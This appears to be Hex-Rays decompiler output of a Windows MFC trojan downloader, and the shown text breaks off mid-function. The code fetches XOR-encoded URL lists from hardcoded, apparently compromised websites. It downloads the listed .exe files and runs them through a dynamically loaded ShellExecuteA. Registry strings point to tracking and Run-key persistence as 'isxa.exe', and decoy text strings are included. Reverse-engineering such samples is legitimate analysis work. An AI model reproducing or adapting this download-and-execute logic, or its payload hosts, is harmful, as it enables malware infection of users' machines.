/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

// LSTATUS __stdcall RegCreateKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD Reserved, LPSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
// LSTATUS __stdcall RegQueryValueExA(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// LSTATUS __stdcall RegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// LSTATUS __stdcall RegCloseKey(HKEY hKey);
// DWORD __stdcall SleepEx(DWORD dwMilliseconds, BOOL bAlertable);
// int __stdcall lstrlenA(LPCSTR lpString);
// DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// void __stdcall Sleep(DWORD dwMilliseconds);
// UINT __stdcall GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize);
// BOOL __stdcall CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// BOOL __stdcall DeleteFileA(LPCSTR lpFileName);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// int __cdecl mbscmp(const unsigned __int8 *Str1, const unsigned __int8 *Str2);
// FILE *__cdecl fopen(const char *FileName, const char *Mode);
// int __cdecl fclose(FILE *Stream);
// int __stdcall GetWindowTextA(HWND hWnd, LPSTR lpString, int nMaxCount);
// int __stdcall GetClassNameA(HWND hWnd, LPSTR lpClassName, int nMaxCount);
// HWND __stdcall GetForegroundWindow();
// DWORD __stdcall GetWindowThreadProcessId(HWND hWnd, LPDWORD lpdwProcessId);
// int __stdcall MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
// HWND __stdcall FindWindowExA(HWND hWndParent, HWND hWndChildAfter, LPCSTR lpszClass, LPCSTR lpszWindow);
void __cdecl sub_401280(unsigned __int8 *Str2);
void __cdecl sub_401358(unsigned __int8 *Str2);
// int __usercall sub_40141C@<eax>(unsigned __int8 *a1@<edi>, CString *a2);
// int __usercall sub_4017D0@<eax>(int a1@<edi>, int a2);
void sub_40192C();
// int __usercall sub_401A34@<eax>(unsigned __int8 *a1@<edi>);
// int __usercall sub_401B40@<eax>(int a1@<edi>, struct CString *a2);
int sub_401F80();
int sub_402134();
// int __usercall sub_4022C4@<eax>(unsigned __int8 *a1@<edi>);
void __noreturn sub_40275C(); // weak
int __thiscall sub_4029F4(int *this, char a2, char a3, int a4);
int __thiscall sub_402B08(void *); // idb
// int __userpurge sub_402B4C@<eax>(int *a1@<ecx>, DWORD a2@<esi>, int a3);
int sub_402BBC();
int sub_402BC0();
HWND __thiscall sub_402C00(int *this);
unsigned int __cdecl sub_402D08(void *); // idb
int sub_402D4C();
void __cdecl sub_402DC4(); // idb
// void __usercall sub_402DD0(int a1@<edi>, int a2@<esi>);
void __cdecl sub_402E28(); // idb
void __cdecl sub_402E34(); // idb
void __cdecl sub_402E40(); // idb
int (**sub_402E4C())();
int sub_402E54();
HKEY __thiscall sub_402E5C(HKEY *this);
// void __usercall sub_402E78(int a1@<ecx>, int a2@<edi>, int a3@<esi>);
// void __usercall sub_402EFC(int a1@<ecx>, int a2@<edi>, int a3@<esi>);
// void __usercall sub_402F58(void *a1@<ecx>, int a2@<edi>, int a3@<esi>);
// void __usercall sub_402FBC(void *a1@<ecx>, int a2@<edi>, int a3@<esi>);
// void __userpurge sub_403020(void *a1@<ecx>, int a2@<edi>, int a3@<esi>, char a4);
// CString *__thiscall CString::CString(CString *__hidden this, const struct CString *); idb
// void __thiscall CString::~CString(CString *__hidden this); idb
// void __thiscall CStringArray::SetAtGrow(CStringArray *__hidden this, int, const struct CString *); idb
// void __thiscall CStringArray::RemoveAt(CStringArray *__hidden this, int, int); idb
// CString *__thiscall CString::CString(CString *__hidden this, const char *); idb
// int __thiscall CString::Replace(CString *__hidden this, const char *, const char *); idb
// int __thiscall CString::ReverseFind(CString *__hidden this, char); idb
// CString *__thiscall CString::CString(CString *__hidden this); idb
// CInternetSession *__thiscall CInternetSession::CInternetSession(CInternetSession *__hidden this, const char *, unsigned int, unsigned int, const char *, const char *, unsigned int); idb
// struct CStdioFile *__thiscall CInternetSession::OpenURL(CInternetSession *__hidden this, const char *, unsigned int, unsigned int, const char *, unsigned int); idb
// void __thiscall CString::SetAt(CString *__hidden this, int, char); idb
// void __thiscall CInternetSession::Close(CInternetSession *__hidden this); idb
// void __thiscall CInternetSession::~CInternetSession(CInternetSession *__hidden this); idb
// int __thiscall CString::Find(CString *__hidden this, const char *); idb
// CStdioFile *__thiscall CStdioFile::CStdioFile(CStdioFile *__hidden this); idb
// int __thiscall CStdioFile::Open(CStdioFile *__hidden this, const char *, unsigned int, struct CFileException *); idb
// int __stdcall operator+(_DWORD, _DWORD, _DWORD); weak
// void __thiscall CStdioFile::WriteString(CStdioFile *__hidden this, const char *); idb
// void __thiscall CStdioFile::Close(CStdioFile *__hidden this); idb
// void __thiscall CStdioFile::~CStdioFile(CStdioFile *__hidden this); idb
// void __thiscall CStringArray::SetSize(CStringArray *__hidden this, int, int); idb
// CStdioFile *__thiscall CStdioFile::CStdioFile(CStdioFile *__hidden this, const char *, unsigned int); idb
// int __thiscall CStdioFile::ReadString(CStdioFile *__hidden this, struct CString *); idb
// int __thiscall CString::Delete(CString *__hidden this, int, int); idb
// int __thiscall CString::operator+=(_DWORD, _DWORD); weak
// int __thiscall CString::operator=(_DWORD, _DWORD); weak
// CFile *__thiscall CFile::CFile(CFile *__hidden this, const char *, unsigned int); idb
// void __thiscall CFile::Close(CFile *__hidden this); idb
// void __thiscall CFile::~CFile(CFile *__hidden this); idb
// void __thiscall CFile::Write(CFile *__hidden this, const void *, unsigned int); idb
// unsigned int __thiscall CFile::GetLength(CFile *__hidden this); idb
// void __thiscall CStringArray::SetAtGrow(CStringArray *__hidden this, int, const char *); idb
// int __thiscall CString::Left(_DWORD, _DWORD, _DWORD); weak
// int __stdcall AfxMessageBox(const char *, unsigned int, unsigned int); idb
// int __thiscall CString::operator=(_DWORD, _DWORD); weak
// int __thiscall CString::operator+=(_DWORD, _DWORD); weak
// struct AFX_MODULE_STATE *__stdcall AfxGetModuleState(); idb
// void __thiscall CString::MakeLower(CString *__hidden this); idb
// struct CWinThread *__stdcall AfxBeginThread(unsigned int (__cdecl *)(void *), void *, int, unsigned int, unsigned int, struct _SECURITY_ATTRIBUTES *); idb
// CStringArray *__thiscall CStringArray::CStringArray(CStringArray *__hidden this); idb
// void __thiscall CStringArray::~CStringArray(CStringArray *__hidden this); idb
// void __cdecl operator delete(void *); idb
// CWinApp *__thiscall CWinApp::CWinApp(CWinApp *__hidden this, const char *); idb
// void __thiscall CWinApp::~CWinApp(CWinApp *__hidden this); idb
// void __stdcall `eh vector constructor iterator'(void *, unsigned int, int, void (__thiscall *)(void *), void (__thiscall *)(void *)); idb
// int __cdecl atexit(void (__cdecl *)());
// void __stdcall `eh vector destructor iterator'(void *, unsigned int, int, void (__thiscall *)(void *)); idb
int __cdecl UserMathErrorFunction();
// int __stdcall AfxInitialize(int, unsigned int); idb
int sub_403642();

//-------------------------------------------------------------------------
// Data declarations

// extern _UNKNOWN CWinApp::messageMap; weak
int dword_40365C = 0; // weak
char byte_403678 = '\0'; // weak
int dword_403680 = 0; // weak
int dword_403760 = 0; // weak
int dword_403764 = 0; // weak
_UNKNOWN FileName; // weak
int dword_403780 = 0; // weak
int dword_403784 = 0; // weak
int dword_403788 = 0; // idb
_UNKNOWN unk_405000; // weak
_UNKNOWN unk_405120; // weak
_UNKNOWN unk_405240; // weak
int (*off_405464)() = &sub_402E54; // weak
struct CRuntimeClass *(__thiscall *off_405AE0)(CWinApp *__hidden this) = &CWinApp::GetRuntimeClass; // weak
char Mode[2] = "r"; // idb
char aZLS[] = "[&&&z&&&l&&s]"; // idb
char asc_405BB4[] = "&"; // idb
char byte_405BB8[4] = { '\0', '\0', '\0', '\0' }; // idb
char aTXT[] = ".))))t))x)))t"; // idb
char asc_405BCC[] = ")"; // idb
CHAR SubKey[] = "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION"; // idb
CHAR ValueName[] = "TTT"; // idb
char asc_405C00[2] = "\n"; // weak
CHAR LibFileName[] = "shell32"; // idb
CHAR ProcName[] = "ShellExecuteA"; // idb
char aOpen[5] = "open"; // weak
char aExe[] = ".exe"; // idb
char aHttpFlusentier[] = "http://flusentiere.de/images/counter/11.txt"; // idb
char aHttpWwwRenatek[] = "http://www.renatekoch.com/html/441.txt"; // idb
char aHttpWwwBerkili[] = "http://www.berkili-maschinen.de/img/log.txt"; // idb
char aHttpAdolfSeege[] = "http://adolf-seeger.de/rs/images/i.txt"; // idb
char aHttpThaibaaOrg[] = "http://thaibaa.org/files/i.txt"; // idb
char aHttpThaifisher[] = "http://thaifisherfolk.com/Doc/i.txt"; // idb
char aHttpAlsiroyalD[] = "http://alsiroyal.de/img/suche/i.txt"; // idb
char aHttpGanzheitli[] = "http://ganzheitliche-kurse.de/RUBRIKEN/i.txt"; // idb
char aCndrnndlkkffhq[] = " cndrnndlkkffhqjhscfrpjbokmjsne"; // idb
CHAR Caption[] = "this success."; // idb
char aJrpsoij[] = " jrpsoij"; // idb
CHAR Text[] = "Accomplishments are of "; // idb
char aEhofchl[] = " ehofchl"; // idb
CHAR aGreatestValueW[] = "greatest value when "; // idb
char aSkbdffspsn[] = " skbdffspsn"; // idb
CHAR aAdvancingOurPr[] = "advancing our progress"; // idb
char aMhcbsroldkkoek[] = " mhcbsroldkkoekpeefjrsrgbdcmq"; // idb
CHAR aTowardTheInsti[] = "toward the institutions "; // idb
char aNrildihdelffgr[] = " nrildihdelffgrbeooerrjmodis"; // idb
CHAR aGoalsFurther[] = "goals. Further, "; // idb
char asc_405E80[2] = "\\"; // weak
char aDriversC656Tx[16] = "drivers\\c656.tx"; // weak
BYTE Data[] = { 105u, 115u, 120u, 97u, 46u, 101u, 120u, 101u, 0u }; // idb
CHAR aSoftwareMicros_0[] = "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN"; // idb
CHAR aIsxa[] = "isxa"; // idb


//----- (00401280) --------------------------------------------------------
void __cdecl sub_401280(unsigned __int8 *Str2)
{
  int v1; // edx
  BOOL v2; // ebx
  int v3; // [esp+0h] [ebp-24h] BYREF
  int v4; // [esp+Ch] [ebp-18h]
  unsigned __int8 *Str1[2]; // [esp+10h] [ebp-14h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  Str1[1] = (unsigned __int8 *)&v3;
  v6 = 0;
  v1 = dword_403788;
  v4 = 0;
  if ( dword_403788 <= 0 )
  {
LABEL_6:
    CStringArray::SetAtGrow((CStringArray *)&dword_403780, v1, (const struct CString *)&Str2);
    v6 = -1;
    CString::~CString((CString *)&Str2);
  }
  else
  {
    while ( 1 )
    {
      CString::CString((CString *)Str1, (const struct CString *)(dword_403784 + 4 * v4));
      v6 = 1;
      v2 = mbscmp(Str1[0], Str2) == 0;
      v6 = 0;
      CString::~CString((CString *)Str1);
      if ( v2 )
        break;
      v1 = dword_403788;
      if ( ++v4 >= dword_403788 )
        goto LABEL_6;
    }
    v6 = -1;
    CString::~CString((CString *)&Str2);
  }
}
// 403780: using guessed type int dword_403780;
// 403784: using guessed type int dword_403784;

//----- (00401358) --------------------------------------------------------
void __cdecl sub_401358(unsigned __int8 *Str2)
{
  BOOL v1; // ebx
  int v2; // [esp+0h] [ebp-24h] BYREF
  int i; // [esp+Ch] [ebp-18h]
  unsigned __int8 *Str1[2]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  Str1[1] = (unsigned __int8 *)&v2;
  v5 = 0;
  for ( i = 0; i < dword_403788; ++i )
  {
    CString::CString((CString *)Str1, (const struct CString *)(dword_403784 + 4 * i));
    v5 = 1;
    v1 = mbscmp(Str1[0], Str2) == 0;
    v5 = 0;
    CString::~CString((CString *)Str1);
    if ( v1 )
      CStringArray::RemoveAt((CStringArray *)&dword_403780, i, 1);
  }
  v5 = -1;
  CString::~CString((CString *)&Str2);
}
// 403780: using guessed type int dword_403780;
// 403784: using guessed type int dword_403784;

//----- (0040141C) --------------------------------------------------------
int __usercall sub_40141C@<eax>(unsigned __int8 *a1@<edi>, CString *a2)
{
  struct CStdioFile *v2; // eax
  int v3; // ebx
  unsigned __int8 *i; // edx
  int v5; // eax
  BOOL v6; // ebx
  int result; // eax
  unsigned __int8 *v8; // [esp-4h] [ebp-58h] BYREF
  int v9; // [esp+0h] [ebp-54h] BYREF
  char v10; // [esp+Ch] [ebp-48h]
  char v11; // [esp+10h] [ebp-44h]
  int v12; // [esp+14h] [ebp-40h]
  unsigned __int8 *Str2; // [esp+18h] [ebp-3Ch] BYREF
  char *v14; // [esp+1Ch] [ebp-38h] BYREF
  unsigned __int8 *Str1; // [esp+20h] [ebp-34h] BYREF
  char v16[20]; // [esp+24h] [ebp-30h] BYREF
  struct CStdioFile *v17; // [esp+38h] [ebp-1Ch]
  unsigned __int8 *v18[2]; // [esp+40h] [ebp-14h] BYREF
  int v19; // [esp+50h] [ebp-4h]

  v18[1] = (unsigned __int8 *)&v9;
  CString::CString((CString *)&Str2, aZLS);
  v19 = 0;
  CString::Replace((CString *)&Str2, asc_405BB4, byte_405BB8);
  CString::CString((CString *)&v14, aTXT);
  v19 = 1;
  CString::Replace((CString *)&v14, asc_405BCC, byte_405BB8);
  if ( CString::ReverseFind(a2, 47) < 3 )
  {
    v19 = 0;
    CString::~CString((CString *)&v14);
    v19 = -1;
    CString::~CString((CString *)&Str2);
    goto LABEL_22;
  }
  CString::CString((CString *)&Str1);
  v19 = 2;
  CInternetSession::CInternetSession((CInternetSession *)v16, 0, 1u, 0, 0, 0, 0x84000000);
  v17 = 0;
  v19 = 4;
  v2 = CInternetSession::OpenURL((CInternetSession *)v16, *(const char **)a2, 1u, 1u, 0, 0);
  v17 = v2;
  if ( v2 )
  {
    v11 = 1;
    if ( (*(int (__thiscall **)(struct CStdioFile *, unsigned __int8 **))(*(_DWORD *)v2 + 96))(v2, &Str1) )
    {
      do
      {
        v3 = 0;
        for ( i = Str1; v3 < *((_DWORD *)Str1 - 2); i = Str1 )
        {
          CString::SetAt((CString *)&Str1, v3, i[v3] ^ 2);
          ++v3;
        }
        if ( v11 )
        {
          if ( mbscmp(i, Str2) )
          {
            (*(void (__thiscall **)(struct CStdioFile *))(*(_DWORD *)v17 + 84))(v17);
            v17 = 0;
            CInternetSession::Close((CInternetSession *)v16);
            v19 = 2;
            CInternetSession::~CInternetSession((CInternetSession *)v16);
            v19 = 1;
            CString::~CString((CString *)&Str1);
            v19 = 0;
            CString::~CString((CString *)&v14);
            v19 = -1;
            CString::~CString((CString *)&Str2);
            goto LABEL_22;
          }
          v11 = 0;
        }
        else
        {
          v8 = a1;
          CString::CString((CString *)&v8, (const struct CString *)&Str1);
          sub_401280(v8);
          v10 = 0;
          v5 = CString::Find((CString *)&Str1, v14);
          if ( v5 == *((_DWORD *)Str1 - 2) - 4 )
          {
            v12 = 0;
            if ( dword_403788 > 0 )
            {
              while ( 1 )
              {
                CString::CString((CString *)v18, (const struct CString *)(dword_403784 + 4 * v12));
                v19 = 5;
                v6 = mbscmp(v18[0], Str1) == 0;
                v19 = 4;
                CString::~CString((CString *)v18);
                if ( v6 )
                  break;
                if ( ++v12 >= dword_403788 )
                  goto LABEL_17;
              }
              v10 = 1;
            }
LABEL_17:
            if ( !v10 )
              sub_40141C((CString *)&Str1);
          }
        }
      }
      while ( (*(int (__thiscall **)(struct CStdioFile *, unsigned __int8 **))(*(_DWORD *)v17 + 96))(v17, &Str1) );
    }
    (*(void (__thiscall **)(struct CStdioFile *))(*(_DWORD *)v17 + 84))(v17);
    v17 = 0;
    v19 = 2;
    CInternetSession::~CInternetSession((CInternetSession *)v16);
    v19 = 1;
    CString::~CString((CString *)&Str1);
    v19 = 0;
    CString::~CString((CString *)&v14);
    v19 = -1;
    CString::~CString((CString *)&Str2);
    result = 1;
  }
  else
  {
    v19 = 2;
    CInternetSession::~CInternetSession((CInternetSession *)v16);
    v19 = 1;
    CString::~CString((CString *)&Str1);
    v19 = 0;
    CString::~CString((CString *)&v14);
    v19 = -1;
    CString::~CString((CString *)&Str2);
LABEL_22:
    result = 0;
  }
  return result;
}
// 403784: using guessed type int dword_403784;

//----- (004017D0) --------------------------------------------------------
int __usercall sub_4017D0@<eax>(int a1@<edi>, int a2)
{
  HKEY v2; // eax
  int v3; // ebx
  int result; // eax
  HKEY v5; // eax
  int v6[4]; // [esp+0h] [ebp-40h] BYREF
  BYTE v7[4]; // [esp+10h] [ebp-30h] BYREF
  CHAR *v8; // [esp+14h] [ebp-2Ch]
  HKEY hKey; // [esp+18h] [ebp-28h] BYREF
  HKEY phkResult; // [esp+1Ch] [ebp-24h] BYREF
  DWORD dwDisposition; // [esp+20h] [ebp-20h] BYREF
  DWORD Type; // [esp+24h] [ebp-1Ch] BYREF
  DWORD cbData; // [esp+28h] [ebp-18h] BYREF
  BYTE Data[4]; // [esp+2Ch] [ebp-14h] BYREF
  int *v15; // [esp+30h] [ebp-10h]
  int v16; // [esp+3Ch] [ebp-4h]

  v15 = v6;
  v6[0] = a1;
  hKey = 0;
  v16 = 0;
  phkResult = 0;
  if ( !RegCreateKeyExA(HKEY_LOCAL_MACHINE, SubKey, 0, 0, 0, 0xF003Fu, 0, &phkResult, &dwDisposition) )
  {
    if ( hKey )
    {
      RegCloseKey(hKey);
      hKey = 0;
    }
    hKey = phkResult;
  }
  if ( a2 )
  {
    v6[3] = (int)&hKey;
    *(_DWORD *)v7 = a2;
    v8 = ValueName;
    RegSetValueExA(hKey, ValueName, 0, 4u, v7, 4u);
    v5 = hKey;
    if ( hKey )
    {
      RegCloseKey(hKey);
      hKey = 0;
      v5 = 0;
    }
    v16 = -1;
    if ( v5 )
    {
      RegCloseKey(v5);
      hKey = 0;
    }
    result = 0;
  }
  else
  {
    cbData = 4;
    Type = 0;
    RegQueryValueExA(hKey, ValueName, 0, &Type, Data, &cbData);
    v2 = hKey;
    if ( hKey )
    {
      RegCloseKey(hKey);
      hKey = 0;
      v2 = 0;
    }
    v3 = *(_DWORD *)Data;
    v16 = -1;
    if ( v2 )
    {
      RegCloseKey(v2);
      hKey = 0;
    }
    result = v3;
  }
  return result;
}

//----- (0040192C) --------------------------------------------------------
void sub_40192C()
{
  int v0; // [esp+0h] [ebp-3Ch] BYREF
  int i; // [esp+Ch] [ebp-30h]
  int v2[5]; // [esp+10h] [ebp-2Ch] BYREF
  char v3[4]; // [esp+24h] [ebp-18h] BYREF
  char *v4[2]; // [esp+28h] [ebp-14h] BYREF
  int v5; // [esp+38h] [ebp-4h]

  v4[1] = (char *)&v0;
  CStdioFile::CStdioFile((CStdioFile *)v2);
  v5 = 0;
  if ( CStdioFile::Open((CStdioFile *)v2, FileName, 0x1021u, 0) )
  {
    (*(void (__thiscall **)(int *, _DWORD, int))(v2[0] + 48))(v2, 0, 2);
    for ( i = 0; i < dword_403788; ++i )
    {
      CString::CString((CString *)v3, (const struct CString *)(dword_403784 + 4 * i));
      v5 = 1;
      operator+(v4, v3, asc_405C00);
      v5 = 2;
      CStdioFile::WriteString((CStdioFile *)v2, v4[0]);
      v5 = 1;
      CString::~CString((CString *)v4);
      v5 = 0;
      CString::~CString((CString *)v3);
    }
  }
  CStdioFile::Close((CStdioFile *)v2);
  v5 = -1;
  CStdioFile::~CStdioFile((CStdioFile *)v2);
}
// 4030E4: using guessed type int __stdcall operator+(_DWORD, _DWORD, _DWORD);
// 403784: using guessed type int dword_403784;

//----- (00401A34) --------------------------------------------------------
int __usercall sub_401A34@<eax>(unsigned __int8 *a1@<edi>)
{
  FILE *v1; // eax
  unsigned __int8 *v3; // [esp-4h] [ebp-3Ch] BYREF
  int v4; // [esp+0h] [ebp-38h] BYREF
  char v5[20]; // [esp+Ch] [ebp-2Ch] BYREF
  int v6[3]; // [esp+20h] [ebp-18h] BYREF
  int v7; // [esp+34h] [ebp-4h]

  v6[2] = (int)&v4;
  v1 = fopen(FileName, Mode);
  if ( !v1 )
    return 0;
  fclose(v1);
  CStringArray::SetSize((CStringArray *)&dword_403780, 0, -1);
  CStdioFile::CStdioFile((CStdioFile *)v5, FileName, 0x20u);
  v7 = 0;
  CString::CString((CString *)v6);
  v7 = 1;
  while ( CStdioFile::ReadString((CStdioFile *)v5, (struct CString *)v6) )
  {
    if ( *(int *)(v6[0] - 8) > 6 )
    {
      v3 = a1;
      CString::CString((CString *)&v3, (const struct CString *)v6);
      sub_401280(v3);
    }
  }
  CStdioFile::Close((CStdioFile *)v5);
  v7 = 0;
  CString::~CString((CString *)v6);
  v7 = -1;
  CStdioFile::~CStdioFile((CStdioFile *)v5);
  return 1;
}
// 403780: using guessed type int dword_403780;

//----- (00401B40) --------------------------------------------------------
int __usercall sub_401B40@<eax>(int a1@<edi>, struct CString *a2)
{
  void *v2; // esp
  int v4; // ebx
  unsigned int i; // eax
  int v6; // esi
  bool v7; // bl
  HINSTANCE (__stdcall *ShellExecuteA)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT); // eax
  HMODULE v9; // eax
  char v10[20]; // [esp+0h] [ebp-8150h] BYREF
  const CHAR *v11; // [esp+14h] [ebp-813Ch] BYREF
  LPCSTR lpFileName; // [esp+18h] [ebp-8138h] BYREF
  struct CStdioFile *v13; // [esp+1Ch] [ebp-8134h]
  char v14[16]; // [esp+20h] [ebp-8130h] BYREF
  char v15[33024]; // [esp+30h] [ebp-8120h] BYREF
  int v16; // [esp+8130h] [ebp-20h]
  int v17; // [esp+813Ch] [ebp-14h]
  char *v18; // [esp+8140h] [ebp-10h]
  int v19; // [esp+814Ch] [ebp-4h]

  v2 = alloca(33092);
  v18 = v10;
  v16 = a1;
  v17 = CString::ReverseFind(a2, 47);
  if ( v17 < 3 )
    return 0;
  CInternetSession::CInternetSession((CInternetSession *)v10, 0, 1u, 0, 0, 0, 0x84000000);
  v19 = 0;
  CString::CString((CString *)&v11, (const struct CString *)&dword_403764);
  v19 = 1;
  CString::CString((CString *)&lpFileName, a2);
  v19 = 2;
  CString::Delete((CString *)&lpFileName, 0, v17 + 1);
  CString::operator+=(&v11, &lpFileName);
  CString::operator=(&lpFileName, &v11);
  v13 = 0;
  v19 = 3;
  v13 = CInternetSession::OpenURL((CInternetSession *)v10, *(const char **)a2, 1u, 1u, 0, 0);
  if ( !v13 )
    goto LABEL_16;
  CFile::CFile((CFile *)v14, lpFileName, 0x1022u);
  v19 = 4;
  v4 = (*(int (__thiscall **)(struct CStdioFile *))(*(_DWORD *)v13 + 56))(v13);
  if ( v4 != sub_4017D0(a1, 0) )
  {
    for ( i = (*(int (__thiscall **)(struct CStdioFile *, char *, int))(*(_DWORD *)v13 + 60))(v13, v15, 0x8000);
          i;
          i = (*(int (__thiscall **)(struct CStdioFile *, char *, int))(*(_DWORD *)v13 + 60))(v13, v15, 0x8000) )
    {
      CFile::Write((CFile *)v14, v15, i);
    }
    v6 = CFile::GetLength((CFile *)v14);
    v7 = CFile::GetLength((CFile *)v14) > 0x400;
    CFile::Close((CFile *)v14);
    (*(void (__thiscall **)(struct CStdioFile *))(*(_DWORD *)v13 + 84))(v13);
    v13 = 0;
    CInternetSession::Close((CInternetSession *)v10);
    if ( v7 )
    {
      ShellExecuteA = (HINSTANCE (__stdcall *)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT))dword_40365C;
      if ( !dword_40365C )
      {
        v9 = LoadLibraryA(LibFileName);
        ShellExecuteA = (HINSTANCE (__stdcall *)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT))GetProcAddress(v9, ProcName);
        dword_40365C = (int)ShellExecuteA;
      }
      if ( (int)ShellExecuteA(0, aOpen, lpFileName, byte_405BB8, v11, 10) > 32 )
      {
        sub_4017D0(a1, v6);
        v19 = 3;
        CFile::~CFile((CFile *)v14);
        v19 = 1;
        CString::~CString((CString *)&lpFileName);
        v19 = 0;
        CString::~CString((CString *)&v11);
        v19 = -1;
        CInternetSession::~CInternetSession((CInternetSession *)v10);
        return 1;
      }
      v19 = 3;
      CFile::~CFile((CFile *)v14);
      v19 = 1;
      CString::~CString((CString *)&lpFileName);
      v19 = 0;
      CString::~CString((CString *)&v11);
      v19 = -1;
      CInternetSession::~CInternetSession((CInternetSession *)v10);
      return 0;
    }
    v19 = 3;
    CFile::~CFile((CFile *)v14);
LABEL_16:
    v19 = 1;
    CString::~CString((CString *)&lpFileName);
    v19 = 0;
    CString::~CString((CString *)&v11);
    v19 = -1;
    CInternetSession::~CInternetSession((CInternetSession *)v10);
    return 0;
  }
  CFile::Close((CFile *)v14);
  (*(void (__thiscall **)(struct CStdioFile *))(*(_DWORD *)v13 + 84))(v13);
  v13 = 0;
  CInternetSession::Close((CInternetSession *)v10);
  DeleteFileA(lpFileName);
  v19 = 3;
  CFile::~CFile((CFile *)v14);
  v19 = 1;
  CString::~CString((CString *)&lpFileName);
  v19 = 0;
  CString::~CString((CString *)&v11);
  v19 = -1;
  CInternetSession::~CInternetSession((CInternetSession *)v10);
  return 1;
}
// 403114: using guessed type int __thiscall CString::operator+=(_DWORD, _DWORD);
// 40311A: using guessed type int __thiscall CString::operator=(_DWORD, _DWORD);
// 40365C: using guessed type int dword_40365C;
// 403764: using guessed type int dword_403764;

//----- (00401F80) --------------------------------------------------------
int sub_401F80()
{
  const struct CString *v0; // edi
  bool v1; // bl
  int v2; // ebx
  unsigned __int8 *v4; // [esp-4h] [ebp-4Ch] BYREF
  int v5; // [esp+0h] [ebp-48h] BYREF
  int v6; // [esp+Ch] [ebp-3Ch]
  int v7; // [esp+10h] [ebp-38h]
  int v8; // [esp+14h] [ebp-34h]
  int i; // [esp+18h] [ebp-30h]
  int v10; // [esp+1Ch] [ebp-2Ch]
  int v11; // [esp+20h] [ebp-28h]
  int v12; // [esp+24h] [ebp-24h] BYREF
  char v13[4]; // [esp+28h] [ebp-20h] BYREF
  int v14; // [esp+2Ch] [ebp-1Ch] BYREF
  char v15[8]; // [esp+30h] [ebp-18h] BYREF
  int *v16; // [esp+38h] [ebp-10h]
  int v17; // [esp+44h] [ebp-4h]

  v16 = &v5;
  v6 = 0;
  for ( i = 0; i < dword_403788; ++i )
  {
    v0 = (const struct CString *)(dword_403784 + 4 * i);
    v10 = 0;
    v11 = 0;
    v8 = 2 * i;
    CString::CString((CString *)&v12, v0);
    v17 = 0;
    if ( *(int *)(v12 - 8) <= 7 )
    {
      v1 = 0;
    }
    else
    {
      CString::CString((CString *)v13, (const struct CString *)(dword_403784 + 2 * v8));
      v11 = 1;
      v17 = 1;
      v7 = CString::Find((CString *)v13, aExe);
      CString::CString((CString *)&v14, (const struct CString *)(dword_403784 + 2 * v8));
      v10 = 1;
      v17 = 2;
      v1 = v7 == *(_DWORD *)(v14 - 8) - 4;
    }
    v17 = -1;
    if ( v10 )
      CString::~CString((CString *)&v14);
    v17 = 0;
    if ( v11 )
      CString::~CString((CString *)v13);
    v17 = -1;
    CString::~CString((CString *)&v12);
    if ( v1 )
    {
      CString::CString((CString *)v15, (const struct CString *)(dword_403784 + 2 * v8));
      v17 = 3;
      v2 = sub_401B40((int)v0, (struct CString *)v15);
      v17 = -1;
      CString::~CString((CString *)v15);
      if ( v2 )
      {
        v6 = 1;
        break;
      }
      v4 = (unsigned __int8 *)v0;
      CString::CString((CString *)&v4, (const struct CString *)(dword_403784 + 2 * v8));
      sub_401358(v4);
      --i;
    }
  }
  sub_40192C();
  return v6;
}
// 403784: using guessed type int dword_403784;

//----- (00402134) --------------------------------------------------------
int sub_402134()
{
  int v0; // esi
  const struct CString *v1; // edi
  bool v2; // bl
  int v3; // ebx
  int v5; // [esp+0h] [ebp-40h] BYREF
  int v6; // [esp+Ch] [ebp-34h]
  int v7; // [esp+10h] [ebp-30h]
  int v8; // [esp+14h] [ebp-2Ch]
  int v9; // [esp+18h] [ebp-28h]
  int v10; // [esp+1Ch] [ebp-24h]
  int v11; // [esp+20h] [ebp-20h] BYREF
  char v12[4]; // [esp+24h] [ebp-1Ch] BYREF
  int v13; // [esp+28h] [ebp-18h] BYREF
  char v14[4]; // [esp+2Ch] [ebp-14h] BYREF
  int *v15; // [esp+30h] [ebp-10h]
  int v16; // [esp+3Ch] [ebp-4h]

  v15 = &v5;
  v8 = 0;
  if ( dword_403788 > 0 )
  {
    do
    {
      v0 = v8;
      v1 = (const struct CString *)(dword_403784 + 4 * v8);
      v9 = 0;
      v10 = 0;
      v7 = 2 * v8;
      CString::CString((CString *)&v11, v1);
      v16 = 0;
      if ( *(int *)(v11 - 8) <= 7 )
      {
        v2 = 0;
      }
      else
      {
        CString::CString((CString *)v12, (const struct CString *)(dword_403784 + 2 * v7));
        v10 = 1;
        v16 = 1;
        v6 = CString::Find((CString *)v12, aExe);
        CString::CString((CString *)&v13, (const struct CString *)(dword_403784 + 2 * v7));
        v9 = 1;
        v16 = 2;
        v2 = v6 != *(_DWORD *)(v13 - 8) - 4;
      }
      v16 = -1;
      if ( v9 )
        CString::~CString((CString *)&v13);
      v16 = 0;
      if ( v10 )
        CString::~CString((CString *)v12);
      v16 = -1;
      CString::~CString((CString *)&v11);
      if ( v2 )
      {
